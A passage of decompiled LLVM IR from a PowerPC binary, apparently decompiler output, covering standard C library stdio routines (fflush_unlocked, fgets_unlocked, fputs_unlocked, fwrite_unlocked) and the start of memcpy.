  uselistorder i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), { 4, 0, 1, 2, 5, 6, 3, 7 }
  uselistorder i16** @global_var_1002c384.280, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000af60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000af40.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000af28, { 1, 0 }
  uselistorder label %dec_label_pc_1000aef8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002c2bc.141 to i32), i32* %r9.global-to-local, align 4
  %v5_1000afa0 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002c2bc.141 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1000afa0, label %dec_label_pc_1000afc4, label %dec_label_pc_1000afb8

dec_label_pc_1000afb8:                            ; preds = %entry
  %v4_1000afb8 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000afb8, label %dec_label_pc_1000afc4, label %dec_label_pc_1000b0f0

dec_label_pc_1000afc4:                            ; preds = %dec_label_pc_1000afb8, %entry
  store i32 268435456, i32* %r9.global-to-local, align 4
  %v2_1000afd0 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000afe4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 ptrtoint (i32* @global_var_1002bf18.278 to i32))
  store i32 268480496, i32* @lr, align 4
  %v1_1000afec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002bf18.278 to i32))
  %v3_1000aff4 = load i32, i32* @global_var_1002c380.279, align 4
  store i32 %v2_1000afd0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000b004 = add i32 %v3_1000aff4, 1
  store i32 %v1_1000b004, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b004, i32* @global_var_1002c380.279, align 4
  store i32 268480532, i32* @lr, align 4
  %v0_1000b010 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000b014 = load i32, i32* @r30, align 4
  %v4_1000b020 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000b014, i32 ptrtoint (i32* @global_var_1002bf00.283 to i32))
  store i32 268480556, i32* @lr, align 4
  %v1_1000b028 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002bf00.283 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_1000afd0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1000b044.307 to i32), i32* @lr, align 4
  %v0_1000b040 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000b0e0.pr = load i32, i32* @r31, align 4
  %v3_1000b0e03 = icmp eq i32 %v0_1000b0e0.pr, 0
  br i1 %v3_1000b0e03, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b048

dec_label_pc_1000b048:                            ; preds = %dec_label_pc_1000afc4, %dec_label_pc_1000b0dc
  %v0_1000b064 = phi i32 [ %v3_1000b0dc, %dec_label_pc_1000b0dc ], [ %v0_1000b0e0.pr, %dec_label_pc_1000afc4 ]
  %v1_1000b048 = inttoptr i32 %v0_1000b064 to i16*
  %v2_1000b048 = load i16, i16* %v1_1000b048, align 2
  %v3_1000b048 = zext i16 %v2_1000b048 to i32
  %v1_1000b04c = and i32 %v3_1000b048, 64
  store i32 %v1_1000b04c, i32* %r9.global-to-local, align 4
  %v3_1000b04c = icmp eq i32 %v1_1000b04c, 0
  br i1 %v3_1000b04c, label %dec_label_pc_1000b0dc, label %dec_label_pc_1000b054

dec_label_pc_1000b054:                            ; preds = %dec_label_pc_1000b048
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b058 = load i32, i32* @global_var_1002c2c0.142, align 4
  %v3_1000b05c = icmp eq i32 %v3_1000b058, 2
  br i1 %v3_1000b05c, label %dec_label_pc_1000b080, label %dec_label_pc_1000b064

dec_label_pc_1000b064:                            ; preds = %dec_label_pc_1000b054
  %v1_1000b064 = add i32 %v0_1000b064, 56
  %v0_1000b06c = load i32, i32* @r30, align 4
  %v4_1000b074 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000b06c, i32 %v1_1000b064)
  store i32 268480640, i32* @lr, align 4
  %v1_1000b07c = call i32 @pthread_mutex_lock(i32 %v1_1000b064)
  %v0_1000b080.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b080

dec_label_pc_1000b080:                            ; preds = %dec_label_pc_1000b054, %dec_label_pc_1000b064
  %v0_1000b094 = phi i32 [ %v0_1000b064, %dec_label_pc_1000b054 ], [ %v0_1000b080.pre, %dec_label_pc_1000b064 ]
  %v1_1000b080 = inttoptr i32 %v0_1000b094 to i16*
  %v2_1000b080 = load i16, i16* %v1_1000b080, align 2
  %v3_1000b080 = zext i16 %v2_1000b080 to i32
  %v0_1000b084 = load i32, i32* @r27, align 4
  %v2_1000b084 = or i32 %v0_1000b084, %v3_1000b080
  %v1_1000b088 = and i32 %v2_1000b084, 832
  %v1_1000b08c = xor i32 %v1_1000b088, 320
  store i32 %v1_1000b08c, i32* %r9.global-to-local, align 4
  %v3_1000b08c = icmp eq i32 %v1_1000b08c, 0
  br i1 %v3_1000b08c, label %dec_label_pc_1000b094, label %dec_label_pc_1000b0c0

dec_label_pc_1000b094:                            ; preds = %dec_label_pc_1000b080
  store i32 %v0_1000b094, i32* @r3, align 4
  store i32 268480668, i32* @lr, align 4
  %v0_1000b098 = call i32 @__stdio_wcommit()
  %v3_1000b09c = icmp eq i32 %v0_1000b098, 0
  br i1 %v3_1000b09c, label %dec_label_pc_1000b0ac, label %dec_label_pc_1000b0a4

dec_label_pc_1000b0a4:                            ; preds = %dec_label_pc_1000b094
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000b0c0

dec_label_pc_1000b0ac:                            ; preds = %dec_label_pc_1000b094
  %v0_1000b0ac = load i32, i32* @r31, align 4
  %v1_1000b0ac = inttoptr i32 %v0_1000b0ac to i16*
  %v2_1000b0ac = load i16, i16* %v1_1000b0ac, align 2
  %v3_1000b0ac = zext i16 %v2_1000b0ac to i32
  %v1_1000b0b0 = add i32 %v0_1000b0ac, 8
  %v2_1000b0b0 = inttoptr i32 %v1_1000b0b0 to i32*
  %v3_1000b0b0 = load i32, i32* %v2_1000b0b0, align 4
  store i32 %v3_1000b0b0, i32* %r9.global-to-local, align 4
  %v1_1000b0b4 = call i32 @__asm_rlwinm(i32 %v3_1000b0ac, i32 0, i32 26, i32 24)
  %v2_1000b0b4 = trunc i32 %v1_1000b0b4 to i16
  %v1_1000b0b8 = load i32, i32* @r31, align 4
  %v2_1000b0b8 = add i32 %v1_1000b0b8, 28
  %v3_1000b0b8 = inttoptr i32 %v2_1000b0b8 to i32*
  store i32 %v3_1000b0b0, i32* %v3_1000b0b8, align 4
  %v3_1000b0bc = load i32, i32* @r31, align 4
  %v4_1000b0bc = inttoptr i32 %v3_1000b0bc to i16*
  store i16 %v2_1000b0b4, i16* %v4_1000b0bc, align 2
  br label %dec_label_pc_1000b0c0

dec_label_pc_1000b0c0:                            ; preds = %dec_label_pc_1000b080, %dec_label_pc_1000b0a4, %dec_label_pc_1000b0ac
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b0c4 = load i32, i32* @global_var_1002c2c0.142, align 4
  %v3_1000b0c8 = icmp eq i32 %v3_1000b0c4, 2
  br i1 %v3_1000b0c8, label %dec_label_pc_1000b0dc, label %dec_label_pc_1000b0d0

dec_label_pc_1000b0d0:                            ; preds = %dec_label_pc_1000b0c0
  store i32 %v2_1000afd0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268480732, i32* @lr, align 4
  %v0_1000b0d8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000b0dc

dec_label_pc_1000b0dc:                            ; preds = %dec_label_pc_1000b0c0, %dec_label_pc_1000b048, %dec_label_pc_1000b0d0
  %v0_1000b0dc = load i32, i32* @r31, align 4
  %v1_1000b0dc = add i32 %v0_1000b0dc, 32
  %v2_1000b0dc = inttoptr i32 %v1_1000b0dc to i32*
  %v3_1000b0dc = load i32, i32* %v2_1000b0dc, align 4
  store i32 %v3_1000b0dc, i32* @r31, align 4
  %v3_1000b0e0 = icmp eq i32 %v3_1000b0dc, 0
  br i1 %v3_1000b0e0, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b048

dec_label_pc_1000b0e8:                            ; preds = %dec_label_pc_1000b0dc, %dec_label_pc_1000afc4
  store i32 ptrtoint (i32* @global_var_1000b0ec.308 to i32), i32* @lr, align 4
  %v0_1000b0e8 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000b128

dec_label_pc_1000b0f0:                            ; preds = %dec_label_pc_1000afb8
  %v3_1000b0f0 = load i16, i16* %arg1, align 2
  %v4_1000b0f0 = zext i16 %v3_1000b0f0 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000b0f8 = and i32 %v4_1000b0f0, 64
  store i32 %v1_1000b0f8, i32* %r9.global-to-local, align 4
  %v3_1000b0f8 = icmp eq i32 %v1_1000b0f8, 0
  br i1 %v3_1000b0f8, label %dec_label_pc_1000b128, label %dec_label_pc_1000b100

dec_label_pc_1000b100:                            ; preds = %dec_label_pc_1000b0f0
  store i32 268480772, i32* @lr, align 4
  %v0_1000b100 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1000b108 = icmp eq i32 %v0_1000b100, 0
  br i1 %v3_1000b108, label %dec_label_pc_1000b110, label %dec_label_pc_1000b128

dec_label_pc_1000b110:                            ; preds = %dec_label_pc_1000b100
  %v0_1000b110 = load i32, i32* @r29, align 4
  %v1_1000b110 = inttoptr i32 %v0_1000b110 to i16*
  %v2_1000b110 = load i16, i16* %v1_1000b110, align 2
  %v3_1000b110 = zext i16 %v2_1000b110 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000b118 = add i32 %v0_1000b110, 8
  %v2_1000b118 = inttoptr i32 %v1_1000b118 to i32*
  %v3_1000b118 = load i32, i32* %v2_1000b118, align 4
  store i32 %v3_1000b118, i32* %r9.global-to-local, align 4
  %v1_1000b11c = call i32 @__asm_rlwinm(i32 %v3_1000b110, i32 0, i32 26, i32 24)
  %v2_1000b11c = trunc i32 %v1_1000b11c to i16
  %v3_1000b120 = load i32, i32* @r29, align 4
  %v4_1000b120 = inttoptr i32 %v3_1000b120 to i16*
  store i16 %v2_1000b11c, i16* %v4_1000b120, align 2
  %v0_1000b124 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b124 = load i32, i32* @r29, align 4
  %v2_1000b124 = add i32 %v1_1000b124, 28
  %v3_1000b124 = inttoptr i32 %v2_1000b124 to i32*
  store i32 %v0_1000b124, i32* %v3_1000b124, align 4
  br label %dec_label_pc_1000b128

dec_label_pc_1000b128:                            ; preds = %dec_label_pc_1000b100, %dec_label_pc_1000b0f0, %dec_label_pc_1000b0e8, %dec_label_pc_1000b110
  %v0_1000b12c = load i32, i32* @r28, align 4
  ret i32 %v0_1000b12c

; uselistorder directives
  uselistorder i32 %v3_1000b0dc, { 1, 2, 0 }
  uselistorder i32 %v1_1000b08c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* @global_var_1002c380.279, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1002bf18.278 to i32), { 0, 3, 2, 5, 6, 1, 4, 7, 8 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000b128, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b0dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b0c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b080, { 1, 0 }
  uselistorder label %dec_label_pc_1000b048, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1000b1e8, label %dec_label_pc_1000b160

dec_label_pc_1000b160:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000b1c83 = add i32 %arg2, -1
  store i32 %v2_1000b1c83, i32* @r29, align 4
  %v4_1000b1d09 = icmp eq i32 %arg2, 1
  br i1 %v4_1000b1d09, label %dec_label_pc_1000b1d4, label %dec_label_pc_1000b168

dec_label_pc_1000b168:                            ; preds = %dec_label_pc_1000b160, %dec_label_pc_1000b1c8.backedge
  %v2_1000b184 = phi i32 [ %v2_1000b18412, %dec_label_pc_1000b1c8.backedge ], [ %tmp, %dec_label_pc_1000b160 ]
  %v0_1000b168 = phi i32 [ %v0_1000b1cc, %dec_label_pc_1000b1c8.backedge ], [ %arg3, %dec_label_pc_1000b160 ]
  %v1_1000b168 = add i32 %v0_1000b168, 16
  %v2_1000b168 = inttoptr i32 %v1_1000b168 to i32*
  %v3_1000b168 = load i32, i32* %v2_1000b168, align 4
  %v1_1000b16c = add i32 %v0_1000b168, 24
  %v2_1000b16c = inttoptr i32 %v1_1000b16c to i32*
  %v3_1000b16c = load i32, i32* %v2_1000b16c, align 4
  %v2_1000b170 = add i32 %v3_1000b168, 1
  store i32 %v2_1000b170, i32* %r11.global-to-local, align 4
  %v3_1000b174 = icmp ult i32 %v3_1000b168, %v3_1000b16c
  %v5_1000b174 = icmp eq i32 %v3_1000b168, %v3_1000b16c
  store i1 %v5_1000b174, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000b174, label %dec_label_pc_1000b17c, label %dec_label_pc_1000b198

dec_label_pc_1000b17c:                            ; preds = %dec_label_pc_1000b168
  %v4_1000b168 = inttoptr i32 %v3_1000b168 to i8*
  %v3_1000b17c = load i8, i8* %v4_1000b168, align 1
  %v3_1000b180 = icmp eq i8 %v3_1000b17c, 10
  store i1 %v3_1000b180, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b184 = inttoptr i32 %v2_1000b184 to i8*
  store i8 %v3_1000b17c, i8* %v3_1000b184, align 1
  %v0_1000b188 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b188 = load i32, i32* @r30, align 4
  %v2_1000b188 = add i32 %v1_1000b188, 16
  %v3_1000b188 = inttoptr i32 %v2_1000b188 to i32*
  store i32 %v0_1000b188, i32* %v3_1000b188, align 4
  %v0_1000b18c = load i32, i32* @r31, align 4
  %v1_1000b18c = add i32 %v0_1000b18c, 1
  store i32 %v1_1000b18c, i32* @r31, align 4
  %v0_1000b190 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b190, label %dec_label_pc_1000b1d4, label %dec_label_pc_1000b1c8.backedge

dec_label_pc_1000b198:                            ; preds = %dec_label_pc_1000b168
  %v1_1000b1cc10 = inttoptr i32 %v0_1000b168 to i16*
  store i32 268480924, i32* @lr, align 4
  %v5_1000b198 = call i32 @getc_unlocked(i16* %v1_1000b1cc10, i32 %v3_1000b168)
  %v6_1000b198 = trunc i32 %v5_1000b198 to i8
  %v4_1000b19c = icmp eq i8 %v6_1000b198, -1
  store i1 %v4_1000b19c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b1a4 = icmp eq i8 %v6_1000b198, 10
  store i1 %v3_1000b1a4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000b19c, label %dec_label_pc_1000b1ac, label %dec_label_pc_1000b1bc

dec_label_pc_1000b1ac:                            ; preds = %dec_label_pc_1000b198
  %v0_1000b1ac = load i32, i32* @r30, align 4
  %v1_1000b1ac = inttoptr i32 %v0_1000b1ac to i16*
  %v2_1000b1ac = load i16, i16* %v1_1000b1ac, align 2
  %v1_1000b1b0 = and i16 %v2_1000b1ac, 8
  %v3_1000b1b0 = icmp eq i16 %v1_1000b1b0, 0
  br i1 %v3_1000b1b0, label %dec_label_pc_1000b1ac.dec_label_pc_1000b1d4_crit_edge, label %dec_label_pc_1000b1e8

dec_label_pc_1000b1ac.dec_label_pc_1000b1d4_crit_edge: ; preds = %dec_label_pc_1000b1ac
  %v0_1000b1d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b1d4

dec_label_pc_1000b1bc:                            ; preds = %dec_label_pc_1000b198
  %v3_1000b1bc = load i32, i32* @r31, align 4
  %v4_1000b1bc = inttoptr i32 %v3_1000b1bc to i8*
  store i8 %v6_1000b198, i8* %v4_1000b1bc, align 1
  %v0_1000b1c0 = load i32, i32* @r31, align 4
  %v1_1000b1c0 = add i32 %v0_1000b1c0, 1
  store i32 %v1_1000b1c0, i32* @r31, align 4
  %v0_1000b1c4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000b1c4, label %dec_label_pc_1000b1d4, label %dec_label_pc_1000b1c8.backedge

dec_label_pc_1000b1c8.backedge:                   ; preds = %dec_label_pc_1000b1bc, %dec_label_pc_1000b17c
  %v2_1000b18412 = phi i32 [ %v1_1000b1c0, %dec_label_pc_1000b1bc ], [ %v1_1000b18c, %dec_label_pc_1000b17c ]
  %v0_1000b1c8 = load i32, i32* @r29, align 4
  %v2_1000b1c8 = add i32 %v0_1000b1c8, -1
  store i32 %v2_1000b1c8, i32* @r29, align 4
  %v0_1000b1cc = load i32, i32* @r30, align 4
  %v4_1000b1d0 = icmp eq i32 %v0_1000b1c8, 1
  br i1 %v4_1000b1d0, label %dec_label_pc_1000b1d4, label %dec_label_pc_1000b168

dec_label_pc_1000b1d4:                            ; preds = %dec_label_pc_1000b1bc, %dec_label_pc_1000b1c8.backedge, %dec_label_pc_1000b17c, %dec_label_pc_1000b160, %dec_label_pc_1000b1ac.dec_label_pc_1000b1d4_crit_edge
  %v2_1000b1e0 = phi i32 [ %v0_1000b1d4.pre, %dec_label_pc_1000b1ac.dec_label_pc_1000b1d4_crit_edge ], [ %tmp, %dec_label_pc_1000b160 ], [ %v1_1000b18c, %dec_label_pc_1000b17c ], [ %v2_1000b18412, %dec_label_pc_1000b1c8.backedge ], [ %v1_1000b1c0, %dec_label_pc_1000b1bc ]
  %v1_1000b1d4 = load i32, i32* @r28, align 4
  %v3_1000b1d4 = icmp ugt i32 %v2_1000b1e0, %v1_1000b1d4
  %v4_1000b1d4 = icmp eq i32 %v2_1000b1e0, %v1_1000b1d4
  store i1 %v4_1000b1d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000b1d4, label %dec_label_pc_1000b1dc, label %dec_label_pc_1000b1e8

dec_label_pc_1000b1dc:                            ; preds = %dec_label_pc_1000b1d4
  %v3_1000b1e0 = inttoptr i32 %v2_1000b1e0 to i8*
  store i8 0, i8* %v3_1000b1e0, align 1
  %v0_1000b1f0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000b1ec

dec_label_pc_1000b1e8:                            ; preds = %dec_label_pc_1000b1ac, %dec_label_pc_1000b1d4, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b1ec

dec_label_pc_1000b1ec:                            ; preds = %dec_label_pc_1000b1dc, %dec_label_pc_1000b1e8
  %v0_1000b1f0 = phi i32 [ %v0_1000b1f0.pre, %dec_label_pc_1000b1dc ], [ 0, %dec_label_pc_1000b1e8 ]
  ret i32 %v0_1000b1f0

; uselistorder directives
  uselistorder i32 %v2_1000b1e0, { 0, 2, 1 }
  uselistorder i8 %v6_1000b198, { 1, 0, 2 }
  uselistorder i32 %v3_1000b16c, { 1, 0 }
  uselistorder i32 %v3_1000b168, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1000b168, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000b1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b1d4, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000b168, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000b21c = call i32 @__GI_strlen()
  store i32 %v0_1000b21c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000b238.309 to i32), i32* @lr, align 4
  %v4_1000b234 = inttoptr i32 %arg2 to i16*
  %v5_1000b234 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000b21c, i16* %v4_1000b234)
  %v1_1000b23c = load i32, i32* @r27, align 4
  %v4_1000b23c = icmp eq i32 %v5_1000b234, %v1_1000b23c
  br i1 %v4_1000b23c, label %dec_label_pc_1000b244, label %dec_label_pc_1000b248

dec_label_pc_1000b244:                            ; preds = %entry
  br label %dec_label_pc_1000b248

dec_label_pc_1000b248:                            ; preds = %entry, %dec_label_pc_1000b244
  %v0_1000b248 = phi i32 [ -1, %entry ], [ %v5_1000b234, %dec_label_pc_1000b244 ]
  ret i32 %v0_1000b248

; uselistorder directives
  uselistorder label %dec_label_pc_1000b248, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000b278 = load i16, i16* %arg4, align 2
  %v4_1000b278 = zext i16 %v3_1000b278 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000b288 = call i32 @__asm_rlwinm(i32 %v4_1000b278, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000b290 = icmp eq i32 %v1_1000b288, 192
  br i1 %v3_1000b290, label %dec_label_pc_1000b2a4, label %dec_label_pc_1000b298

dec_label_pc_1000b298:                            ; preds = %entry
  store i32 268481180, i32* @lr, align 4
  %v0_1000b298 = call i32 @__stdio_trans2w_o()
  %v3_1000b29c = icmp eq i32 %v0_1000b298, 0
  br i1 %v3_1000b29c, label %dec_label_pc_1000b2a4, label %dec_label_pc_1000b2fc

dec_label_pc_1000b2a4:                            ; preds = %dec_label_pc_1000b298, %entry
  %v0_1000b2a4 = load i32, i32* @r29, align 4
  %v3_1000b2a4 = icmp eq i32 %v0_1000b2a4, 0
  %v0_1000b2a8 = load i32, i32* @r30, align 4
  %v3_1000b2a8 = icmp eq i32 %v0_1000b2a8, 0
  %brmerge = or i1 %v3_1000b2a4, %v3_1000b2a8
  br i1 %brmerge, label %dec_label_pc_1000b2fc, label %dec_label_pc_1000b2b4

dec_label_pc_1000b2b4:                            ; preds = %dec_label_pc_1000b2a4
  %v2_1000b2bc = udiv i32 -1, %v0_1000b2a4
  %v0_1000b2c0 = load i32, i32* @r31, align 4
  %v3_1000b2c4 = icmp ugt i32 %v0_1000b2a8, %v2_1000b2bc
  %v1_1000b2dc = inttoptr i32 %v0_1000b2c0 to i16*
  br i1 %v3_1000b2c4, label %dec_label_pc_1000b2dc, label %dec_label_pc_1000b2cc

dec_label_pc_1000b2cc:                            ; preds = %dec_label_pc_1000b2b4
  %v0_1000b2b8 = load i32, i32* @r28, align 4
  %v2_1000b2cc = mul i32 %v0_1000b2a8, %v0_1000b2a4
  store i32 %v2_1000b2cc, i32* %r4.global-to-local, align 4
  store i32 268481236, i32* @lr, align 4
  %v5_1000b2d0 = call i32 @__stdio_fwrite(i32 %v0_1000b2b8, i32 %v2_1000b2cc, i16* %v1_1000b2dc)
  %v1_1000b2d4 = load i32, i32* @r29, align 4
  %v2_1000b2d4 = udiv i32 %v5_1000b2d0, %v1_1000b2d4
  store i32 %v2_1000b2d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000b300

dec_label_pc_1000b2dc:                            ; preds = %dec_label_pc_1000b2b4
  %v2_1000b2dc = load i16, i16* %v1_1000b2dc, align 2
  %v1_1000b2e0 = or i16 %v2_1000b2dc, 8
  store i16 %v1_1000b2e0, i16* %v1_1000b2dc, align 2
  %v0_1000b2e8 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000b2f4 = inttoptr i32 %v0_1000b2e8 to i32*
  store i32 22, i32* %v2_1000b2f4, align 4
  %v0_1000b304.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000b300

dec_label_pc_1000b2fc:                            ; preds = %dec_label_pc_1000b2a4, %dec_label_pc_1000b298
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000b300

dec_label_pc_1000b300:                            ; preds = %dec_label_pc_1000b2dc, %dec_label_pc_1000b2cc, %dec_label_pc_1000b2fc
  %v0_1000b304 = phi i32 [ %v0_1000b304.pre, %dec_label_pc_1000b2dc ], [ %v2_1000b2d4, %dec_label_pc_1000b2cc ], [ 0, %dec_label_pc_1000b2fc ]
  ret i32 %v0_1000b304

; uselistorder directives
  uselistorder i16* %v1_1000b2dc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder label %dec_label_pc_1000b300, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000b318 = load i32, i32* @r5, align 4
  %v1_1000b318 = call i32 @__asm_rlwinm.(i32 %v0_1000b318, i32 29, i32 3, i32 31)
  store i32 %v1_1000b318, i32* %r9.global-to-local, align 4
  %v4_1000b318 = icmp eq i32 %v1_1000b318, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000b31c = load i32, i32* @r4, align 4
  %v1_1000b31c = add i32 %v0_1000b31c, -4
  store i32 %v1_1000b31c, i32* %r4.global-to-local, align 4
  %v0_1000b320 = load i32, i32* @r3, align 4
  %v1_1000b320 = add i32 %v0_1000b320, -4
  store i32 %v1_1000b320, i32* @r11, align 4
  br i1 %v4_1000b318, label %dec_label_pc_1000b348, label %dec_label_pc_1000b328

dec_label_pc_1000b328:                            ; preds = %entry
  %v1_1000b328 = urem i32 %v1_1000b320, 4
  %v3_1000b328 = icmp eq i32 %v1_1000b328, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000b328, label %dec_label_pc_1000b330, label %dec_label_pc_1000b384

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge, %dec_label_pc_1000b328
  %v1_1000b33c.pre = phi i32 [ %v1_1000b320, %dec_label_pc_1000b328 ], [ %v1_1000b33c.pre.pre, %dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge ]
  %v0_1000b330 = phi i32 [ %v1_1000b318, %dec_label_pc_1000b328 ], [ %v1_1000b3a4, %dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000b328 ], [ %v2_1000b38c, %dec_label_pc_1000b3a4.dec_label_pc_1000b330_crit_edge ]
  store i32 %v0_1000b330, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b334

dec_label_pc_1000b334:                            ; preds = %dec_label_pc_1000b334, %dec_label_pc_1000b330
  %v1_1000b33c = phi i32 [ %v2_1000b340, %dec_label_pc_1000b334 ], [ %v1_1000b33c.pre, %dec_label_pc_1000b330 ]
  %v0_1000b334 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b334 = add i32 %v0_1000b334, 4
  %v2_1000b334 = inttoptr i32 %v1_1000b334 to i32*
  %v3_1000b334 = load i32, i32* %v2_1000b334, align 4
  %v1_1000b338 = add i32 %v0_1000b334, 8
  %v2_1000b338 = inttoptr i32 %v1_1000b338 to i32*
  %v3_1000b338 = load i32, i32* %v2_1000b338, align 4
  store i32 %v3_1000b338, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b338, i32* %r4.global-to-local, align 4
  %v2_1000b33c = add i32 %v1_1000b33c, 4
  %v3_1000b33c = inttoptr i32 %v2_1000b33c to i32*
  store i32 %v3_1000b334, i32* %v3_1000b33c, align 4
  %v0_1000b340 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b340 = load i32, i32* @r11, align 4
  %v2_1000b340 = add i32 %v1_1000b340, 8
  %v3_1000b340 = inttoptr i32 %v2_1000b340 to i32*
  store i32 %v0_1000b340, i32* %v3_1000b340, align 4
  store i32 %v2_1000b340, i32* @r11, align 4
  %v0_1000b344 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b344 = add i32 %v0_1000b344, -1
